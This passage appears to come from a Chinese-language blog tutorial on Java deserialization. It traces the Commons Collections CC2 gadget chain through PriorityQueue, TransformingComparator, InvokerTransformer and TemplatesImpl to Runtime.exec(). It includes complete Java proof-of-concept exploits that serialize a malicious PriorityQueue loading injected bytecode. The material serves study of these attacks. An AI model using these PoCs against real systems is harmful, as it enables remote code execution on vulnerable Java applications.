class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Gadget chain：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readobject-&gt;(proxy)lazyMap.entrySet</span><br><span class="line">-&gt;AnnotationInvocationHandler.invoke-&gt;lazyMap.get</span><br><span class="line">-&gt;ChainedTransformer.transform-&gt;ConstantTransformer.transform</span><br><span class="line">-&gt;InstantiateTransformer.transform-&gt;TrAXFilter(构造方法)</span><br><span class="line">-&gt;TemplatesImpl.newTransformer-&gt;TemplatesImpl.getTransletInstance</span><br><span class="line">-&gt;TemplatesImpl.defineTransletClasses</span><br><span class="line">-&gt;(动态创建的类)cc2.newInstance()-&gt;Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="CC2链"><a href="#CC2链" class="headerlink" title="CC2链"></a>CC2链</h2><h3 id="前置-2"><a href="#前置-2" class="headerlink" title="前置"></a>前置</h3><p>这里的环境有所不同，用到的是cc4，是因为我们这里用到了一个叫TransformingComparator的类，它在3.1-3.2.1版本中并没有去实现Serializable接口，也就是说这是不可以被序列化的。所以在利用链上就不能使用他去构造。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210938579.png" alt="img"></p><p>jdk8u65</p><p>到这可能会有疑问，前面的cc链是否可以采用cc4。</p><p>前面学习的cc链都是基于commons-collections:commons-collections的3.1-3.2.1这几个版本的，但后面有了新的分支org.apache.commons:commons-collections4的4.0版本。</p><p>可以发现groupId和artifactId都发生了改变，也就是形成了两个分支。这是因为commons-collections4不是用来替换commons-collections的一个新版本，而是修复旧的commons-collections的⼀些架构和API设计上的问题的一个拓展。</p><p>两者的命名空间并不冲突，都可以放在同一个项目中，所以我们只要将之前的collections后面加上一个4就好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.TransformedMap;</span><br></pre></td></tr></table></figure><p>然后我们再次观察代码，会发现LazyMap的decorate爆红了。</p><p><img src="/./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC%E9%93%BE.assets/1741330005726-e9a5dadf-1b2c-45c1-8fc9-04ad011de279.png" alt="img"></p><p>这是由于在cc4中LazyMap的decorate方法被删掉了，但是有一个替代的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="title function_">lazyMap</span><span class="params">(<span class="keyword">final</span> Map&lt;K, V&gt; map, <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> K, ? extends V&gt; factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>&lt;K,V&gt;(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实差不多，我们直接将decorate换成这个方法就可以继续运行了，TransformedMap其实也是一样的，改成transformedMap就好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;K, V&gt; TransformedMap&lt;K, V&gt; <span class="title function_">transformedMap</span><span class="params">(<span class="keyword">final</span> Map&lt;K, V&gt; map,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> K, ? extends K&gt; keyTransformer,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> V, ? extends V&gt; valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> TransformedMap&lt;K, V&gt; decorated = <span class="keyword">new</span> <span class="title class_">TransformedMap</span>&lt;K, V&gt;(map, keyTransformer, valueTransformer);</span><br><span class="line">    <span class="keyword">if</span> (map.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> Map&lt;K, V&gt; transformed = decorated.transformMap(map);</span><br><span class="line">        decorated.clear();</span><br><span class="line">        decorated.decorated().putAll(transformed);  <span class="comment">// avoids double transformation</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> decorated;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们之前的链子就可以正常的触发了。</p><p>我们再来了解一下前面说的那个TransformingComparator类，它其实是和CC1中的ChainedTransformer类似。作用是在比较两个对象之前，先对它们进行某种转换，然后再使用内部的 Comparator 进行比较。</p><p>我们主要来看它的compare方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public int compare(final I obj1, final I obj2) &#123;</span><br><span class="line">    final O value1 = this.transformer.transform(obj1);</span><br><span class="line">    final O value2 = this.transformer.transform(obj2);</span><br><span class="line">    return this.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用transformer的transform方法，并且这个方法还是一个public的方法。</p><p>还有一个PriorityQueue类我们也要了解。它是一个 基于堆（heap） 的优先队列，默认情况下是最小堆（即每次取出元素时，都是当前队列中的最小值）。</p><p>它的部分构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue()           </span><br><span class="line"><span class="comment">// 使用默认的初始容量（11）创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span></span><br><span class="line">PriorityQueue(<span class="type">int</span> initialCapacity)</span><br><span class="line"><span class="comment">// 使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span></span><br></pre></td></tr></table></figure><p>常见方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(E e)           <span class="comment">// 将指定的元素插入此优先级队列</span></span><br><span class="line">clear()            <span class="comment">// 从此优先级队列中移除所有元素。</span></span><br><span class="line">comparator()       <span class="comment">// 返回用来对此队列中的元素进行排序的比较器；如果此队列根据其元素的自然顺序进行排序，则返回 null</span></span><br><span class="line">contains(Object o)          <span class="comment">// 如果此队列包含指定的元素，则返回 true。</span></span><br><span class="line">iterator()           <span class="comment">// 返回在此队列中的元素上进行迭代的迭代器。</span></span><br><span class="line">offer(E e)           <span class="comment">// 将指定的元素插入此优先级队列</span></span><br><span class="line">peek()           <span class="comment">// 获取但不移除此队列的头；如果此队列为空，则返回 null。</span></span><br><span class="line">poll()           <span class="comment">// 获取并移除此队列的头，如果此队列为空，则返回 null。</span></span><br><span class="line">remove(Object o)           <span class="comment">// 从此队列中移除指定元素的单个实例（如果存在）。</span></span><br><span class="line">size()           <span class="comment">// 返回此 collection 中的元素数。</span></span><br><span class="line">toArray()          <span class="comment">// 返回一个包含此队列所有元素的数组。</span></span><br></pre></td></tr></table></figure><p>代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">    priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">    priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">    System.out.println(priorityQueue.poll());</span><br><span class="line">    System.out.println(priorityQueue.poll());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p>然后是它的readObject我们需要关注一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = new Object[size];</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.读取基本字段</span><br><span class="line">调用 s.defaultReadObject();，恢复 PriorityQueue 的 size（元素个数） 和 comparator（比较器）（非 transient 字段）。</span><br><span class="line">读取一个 int（旧版遗留，不使用）。</span><br><span class="line">2.恢复元素数组</span><br><span class="line">由于 queue 数组是 transient，不会被默认序列化，需要手动创建新的 queue 数组，长度为 size。</span><br><span class="line">3.填充元素</span><br><span class="line">使用 for 循环，从输入流 s 逐个读取 size 个对象，并存入 queue 数组。</span><br><span class="line">4.重建堆</span><br><span class="line">调用 heapify(); 方法，重新调整 queue 数组，使其满足最小堆性质。</span><br></pre></td></tr></table></figure><p>最后给出该链子的Gadget chain：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  PriorityQueue.readObject()</span><br><span class="line">    PriorityQueue.heapify()</span><br><span class="line">      PriorityQueue.siftDown()</span><br><span class="line">        PriorityQueue.siftDownUsingComparator()</span><br><span class="line">          TransformingComparator.compare()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              Method.invoke()</span><br><span class="line">                Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>其实后面是差不多的，只不过我们直接去用InvokerTransform去触发了，而不再是写一个ChainedTransformer，用到的还是TemplatesImpl加载类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String encoded = GenerateClassBase.getEncodedClass();</span><br><span class="line">byte[] code = Base64.getDecoder().decode(encoded);</span><br><span class="line">TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);</span><br><span class="line">setFieldValue(obj, &quot;_name&quot;, &quot;Mash1r0&quot;);</span><br><span class="line">setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);</span><br></pre></td></tr></table></figure><p>前面说过了有一个类是类似于ChainedTransformer的。</p><p>我们可以利用TransformingComparator的compare方法去触发传入对象的transform。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TransformingComparator comparator = new TransformingComparator(transformer);</span><br></pre></td></tr></table></figure><p>接下来我们就需要跟进去看看谁调用了compare这个方法。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210940869.png" alt="img"></p><p>在PriorityQueue有两个方法中调用了该方法，我们都可以跟进去找，但是会发现siftDownUsingComparator会走到我们需要的readObject。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210940764.png" alt="img"></p><p>继续往下找。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210941415.png" alt="img"></p><p>找到siftDown，继续找。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210941112.png" alt="img"></p><p>这时候其实就已经确定了是能够走到readObject的，我们前面分析了readObject，它会调用heapify函数。</p><p>然后我们还需要确保每一步的正确进行。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210941779.png" alt="img"></p><p>在readObject里面没有判断的操作，一定会走到heapify，直接往后走。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210941861.png" alt="img"></p><p>这里的queue是我们的队列成员，我们要将前面TemplatesImpl实例化的obj传进来。</p><p>这里虽然没有if去做判断，但是有一个for的判断，如果没有调用到我们需要的siftDown就已经退出，我们就达不到目的，所以我们要看看这个size的操作。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210941805.png" alt="img"></p><p>在这段代码中，size 是 当前对象（this） 的堆的大小，也就是当前堆的元素数量。</p><p>然后无符号右移1位，整数向右移动 1 位，不保留符号位，所以我们至少是需要2位才能有有效的i，并且此时i为0，我们只能siftDown触发queue[0]，也就是第一个队列成员。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210941752.png" alt="img"></p><p>这里做了一个判断，我们是要进if的，判断了comparator是否为空，我们可以看看这个变量是怎么来的。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210941377.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210941473.png" alt="img"></p><p>是在我们实例化的时候构造的，我们这里会传入前面TransformingComparator生成的comparator，所以肯定不会为null，我们继续往后走。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210942992.png" alt="img"></p><p>在这段代码中，comparator的compare方法其实是一定会调用的。</p><p>继续往后走。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210942077.png" alt="img"></p><p>到了compare方法，也是没有判断，会去触发transform函数。</p><p>最后就是InvokerTransformer的transform去触发了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210942455.png" alt="img"></p><p>可以看到最后返回了一个method.invoke，也就是我们反射调用我们传进去对象的方法，iArgs是一系列参数，也就是触发了newTransformer，后面就是TemplatesImpl加载任意类了。</p><p>然后我们就可以来构造poc了，前面已经到了生成comparator，由于PriorityQueue构造器是public，我们直接传进去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);</span><br></pre></td></tr></table></figure><h4 id="反射修改值"><a href="#反射修改值" class="headerlink" title="反射修改值"></a>反射修改值</h4><p>然后把我们的恶意对象obj放在队列的第一个成员，并且需要满足size至少大于2，我们先来尝试用反射去修改这两个值。</p><p>是可以成功的，poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> GenerateClassBase.getEncodedClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(encoded);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Mash1r0&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj,<span class="number">1</span>&#125;);</span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们利用反射修改了size为2，然后传入了queue数组进去，前面分析过了第0个要为obj对象。</p><h4 id="add添加值"><a href="#add添加值" class="headerlink" title="add添加值"></a>add添加值</h4><p>看了很多师傅的wp都用了这个，其实还是用的反射，不过可以了解一下这是为什么。</p><p>用add的方式进行进行触发，但是这里我们需要来看看我们之前分析过的东西。</p><p>当时我们在寻找compare的时候还有一个siftUpUsingComparator类，虽然走到最后是不能到readObject，但是它也有一些有趣的地方。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210942107.png" alt="img"></p><p>继续跟进。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210942353.png" alt="img"></p><p>与Down类似的判断，继续跟进。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210942480.png" alt="img"></p><p>发现两个，我们这里去看offer。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210942799.png" alt="img"></p><p>再继续往后走。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210942534.png" alt="img"></p><p>就会发现到我们的add了，前面也说过常用方法，它能够用来添加队列成员，但是经过我们的分析，它是能够直接去触发我们的命令执行的。</p><p>也就是我们在add之前不能传入恶意对象这些，会导致命令的提前触发，需要在add后面利用反射对queue里面的属性进行修改，有点多此一举的感觉。</p><p>完整poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> GenerateClassBase.getEncodedClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(encoded);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Mash1r0&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//        setFieldValue(queue,&quot;size&quot;,2);</span></span><br><span 